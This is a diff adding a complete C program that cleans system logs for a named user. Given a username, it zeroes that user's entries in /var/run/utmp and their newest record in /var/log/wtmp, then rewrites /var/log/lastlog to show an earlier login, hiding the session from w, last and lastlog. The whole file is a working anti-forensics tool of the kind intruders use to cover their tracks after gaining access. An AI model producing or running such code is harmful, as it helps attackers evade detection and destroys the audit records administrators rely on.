@@ -1,0 +1,122 @@
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/var/log/wtmp"
+#define UTMP_NAME "/var/run/utmp"  //command w to hide
+#define LASTLOG_NAME "/var/log/lastlog"
+ 
+int f;
+struct utmp lastloginfo; //record information for kill_lastlog to use)
+  
+void kill_utmp(char* who)
+{
+	struct utmp utmp_ent;
+ 
+	if ((f=open(UTMP_NAME,O_RDWR))>=0) 
+	{
+		while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+		if (!strncmp(utmp_ent.ut_name,who,strlen(who))) 
+		{
+			bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+			lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+			write (f, &utmp_ent, sizeof (utmp_ent));
+		}
+		close(f);
+	}
+}
+ 
+void kill_wtmp(char* who)
+{
+	struct utmp utmp_ent;
+	long pos=1;
+	int times = 0;
+	
+	if ((f=open(WTMP_NAME,O_RDWR))>=0) 
+	{
+		while( times < 2) 
+		{
+			if(lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND) == -1)
+				break;
+			else 
+			{
+				read (f, &utmp_ent, sizeof (struct utmp));
+				if (!strncmp(utmp_ent.ut_name,who,strlen(who))) 
+				{
+					if( times == 0)
+					{
+						//current time be zero(newest record)
+						bzero((char *)&utmp_ent,sizeof(struct utmp ));
+						lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+						write (f, &utmp_ent, sizeof (utmp_ent)); 
+					}
+					else
+					{
+						//record information of last login
+						lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+						read(f,&lastloginfo,sizeof(lastloginfo));
+					}	
+					times ++;					
+				}					
+			}
+			
+			pos ++;
+		}
+		close(f);
+	}
+	
+	if( times !=2 )
+		lastloginfo.ut_time = 0;
+}
+ 
+void kill_lastlog(char* who)
+{
+	struct passwd *pwd;
+	struct lastlog newll; 
+	struct lastlog linfo;
+ 
+	if ((pwd=getpwnam(who))!=NULL) 
+	{
+		if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) 
+		{
+			lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+
+			if(lastloginfo.ut_time)
+			{
+				//last info
+				linfo.ll_time = lastloginfo.ut_time;
+				memcpy(linfo.ll_line,lastloginfo.ut_line,UT_LINESIZE);
+				memcpy(linfo.ll_host,lastloginfo.ut_host,UT_HOSTSIZE);
+				write(f, (char *)&linfo, sizeof( linfo ));
+			}
+			else
+			{
+				bzero((char *)&newll,sizeof( newll ));
+				write(f, (char *)&newll, sizeof( newll ));
+			}
+			
+			close(f);
+		}
+	} 
+	else 
+		printf("%s: ?\n",who);
+}
+ 
+int main(int argc,char* argv[])
+{
+	if (argc==2) 
+	{
+		kill_wtmp(argv[1]);
+		kill_utmp(argv[1]);
+		kill_lastlog(argv[1]);
+		printf("Ok!\n");
+	} 
+	else
+		printf("Error.\n");
+		
+	return 0;
+} 
